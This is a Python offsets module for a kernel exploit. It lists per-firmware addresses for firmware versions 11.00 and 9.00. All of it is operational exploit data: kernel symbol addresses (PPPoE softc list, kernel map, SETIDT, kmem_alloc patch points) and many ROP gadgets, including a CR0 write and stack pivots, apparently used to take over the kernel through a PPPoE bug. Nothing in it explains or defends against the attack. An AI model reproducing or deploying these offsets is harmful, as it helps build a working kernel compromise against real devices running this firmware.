class OffsetsFirmware_1100:
    # Address of PPPOE_SOFTC list
    PPPOE_SOFTC_LIST = 0xffffffff844e2578

    # Address of kernel map
    KERNEL_MAP = 0xffffffff843ff130

    # Address of SETIDT
    SETIDT = 0xffffffff8245bdb0

    # Addresses for KMEM allocation and patches
    KMEM_ALLOC = 0xffffffff82445e10
    KMEM_ALLOC_PATCH1 = 0xffffffff82445edc
    KMEM_ALLOC_PATCH2 = 0xffffffff82445ee4

    # Address of memcpy function
    MEMCPY = 0xffffffff824dddf0

    # Address of MOV_CR0_RSI_UD2_MOV_EAX_1_RET gadget
    MOV_CR0_RSI_UD2_MOV_EAX_1_RET = 0xffffffff824f1299

    # Offset for the second gadget
    SECOND_GADGET_OFF = 0x3e

    # Address of the first gadget
    FIRST_GADGET = 0xffffffff82eb1f97

    # Address of PUSH_RBP_JMP_QWORD_PTR_RSI gadget
    PUSH_RBP_JMP_QWORD_PTR_RSI = 0xffffffff82c75166

    # Address of POP_RBX_POP_R14_POP_RBP_JMP_QWORD_PTR_RSI_10 gadget
    POP_RBX_POP_R14_POP_RBP_JMP_QWORD_PTR_RSI_10 = 0xffffffff824b90e1

    # Address of LEA_RSP_RSI_20_REPZ_RET gadget
    LEA_RSP_RSI_20_REPZ_RET = 0xffffffff8293c8c6

    # Addresses for stack adjustment and return gadgets
    ADD_RSP_28_POP_RBP_RET = 0xffffffff826cb2da
    ADD_RSP_B0_POP_RBP_RET = 0xffffffff824cdd5f

    # Address of RET gadget
    RET = 0xffffffff822007e4

    # Addresses of POP registers gadgets
    POP_RDI_RET = 0xffffffff825f38ed
    POP_RSI_RET = 0xffffffff8224a6a9
    POP_RDX_RET = 0xffffffff822a4762
    POP_RCX_RET = 0xffffffff8221170a
    POP_R8_POP_RBP_RET = 0xffffffff8224ae4d
    POP_R12_RET = 0xffffffff8279faaf
    POP_RAX_RET = 0xffffffff8221172e
    POP_RBP_RET = 0xffffffff822008df

    # Address of PUSH_RSP_POP_RSI_RET gadget
    PUSH_RSP_POP_RSI_RET = 0xffffffff82bb5c7a

    # Address of MOV_RDI_QWORD_PTR_RDI_POP_RBP_JMP_RAX gadget
    MOV_RDI_QWORD_PTR_RDI_POP_RBP_JMP_RAX = 0xffffffff823ce260

    # Address of MOV_BYTE_PTR_RCX_AL_RET gadget
    MOV_BYTE_PTR_RCX_AL_RET = 0xffffffff8236ae58

    # Addresses of MOV and CALL gadgets
    MOV_RDI_RBX_CALL_R12 = 0xffffffff8233426c
    MOV_RDI_R14_CALL_R12 = 0xffffffff823340a7
    MOV_RSI_RBX_CALL_RAX = 0xffffffff82512dce
    MOV_R14_RAX_CALL_R8 = 0xffffffff82624df8

    # Address of ADD_RDI_RCX_RET gadget
    ADD_RDI_RCX_RET = 0xffffffff82cb535a

    # Address of SUB_RSI_RDX_MOV_RAX_RSI_POP_RBP_RET gadget
    SUB_RSI_RDX_MOV_RAX_RSI_POP_RBP_RET = 0xffffffff8260f297

    # Address of JMP_R14 gadget
    JMP_R14 = 0xffffffff82b84657


class OffsetsFirmware_900:
    # Address of PPPOE_SOFTC list
    PPPOE_SOFTC_LIST = 0xffffffff843ed9f8

    # Address of kernel map
    KERNEL_MAP = 0xffffffff84468d48

    # Address of SETIDT
    SETIDT = 0xffffffff82512c40

    # Addresses for KMEM allocation and patches
    KMEM_ALLOC = 0xffffffff8257be70
    KMEM_ALLOC_PATCH1 = 0xffffffff8257bf3c
    KMEM_ALLOC_PATCH2 = 0xffffffff8257bf44

    # Address of memcpy function
    MEMCPY = 0xffffffff824714b0

    # Address of MOV_CR0_RSI_UD2_MOV_EAX_1_RET gadget
    MOV_CR0_RSI_UD2_MOV_EAX_1_RET = 0xffffffff823fb949

    # Offset for the second gadget
    SECOND_GADGET_OFF = 0x3d

    # Address of the first gadget
    FIRST_GADGET = 0xffffffff82996603

    # Address of PUSH_RBP_JMP_QWORD_PTR_RSI gadget
    PUSH_RBP_JMP_QWORD_PTR_RSI = 0xffffffff82c76646

    # Address of POP_RBX_POP_R14_POP_RBP_JMP_QWORD_PTR_RSI_10 gadget
    POP_RBX_POP_R14_POP_RBP_JMP_QWORD_PTR_RSI_10 = 0xffffffff822b4151

    # Address of LEA_RSP_RSI_20_REPZ_RET gadget
    LEA_RSP_RSI_20_REPZ_RET = 0xffffffff82941e46

    # Addresses for stack adjustment and return gadgets
    ADD_RSP_28_POP_RBP_RET = 0xffffffff826c52aa
    ADD_RSP_B0_POP_RBP_RET = 0xffffffff8251b08f

    # Address of RET gadget
    RET = 0xffffffff822008e0

    # Addresses of POP registers gadgets
    POP_RDI_RET = 0xffffffff822391a8
    POP_RSI_RET = 0xffffffff822aad39
    POP_RDX_RET = 0xffffffff82322eba
    POP_RCX_RET = 0xffffffff822445e7
    POP_R8_POP_RBP_RET = 0xffffffff822ab4dd
    POP_R12_RET = 0xffffffff8279fa0f
    POP_RAX_RET = 0xffffffff82234ec8
    POP_RBP_RET = 0xffffffff822008df

    # Address of PUSH_RSP_POP_RSI_RET gadget
    PUSH_RSP_POP_RSI_RET = 0xffffffff82bb687a

    # Address of MOV_RDI_QWORD_PTR_RDI_POP_RBP_JMP_RAX gadget
    MOV_RDI_QWORD_PTR_RDI_POP_RBP_JMP_RAX = 0xffffffff82244ed0

    # Address of MOV_BYTE_PTR_RCX_AL_RET gadget
    MOV_BYTE_PTR_RCX_AL_RET = 0xffffffff82b7450e

    # Addresses of MOV and CALL gadgets
    MOV_RDI_RBX_CALL_R12 = 0xffffffff82632b9c
    MOV_RDI_R14_CALL_R12 = 0xffffffff8235b387
    MOV_RSI_RBX_CALL_RAX = 0xffffffff822e3d7e
    MOV_R14_RAX_CALL_R8 = 0xffffffff82363918

    # Address of ADD_RDI_RCX_RET gadget
    ADD_RDI_RCX_RET = 0xffffffff82cb683a

    # Address of SUB_RSI_RDX_MOV_RAX_RSI_POP_RBP_RET gadget
    SUB_RSI_RDX_MOV_RAX_RSI_POP_RBP_RET = 0xffffffff82409557

    # Address of JMP_R14 gadget
    JMP_R14 = 0xffffffff82b85693
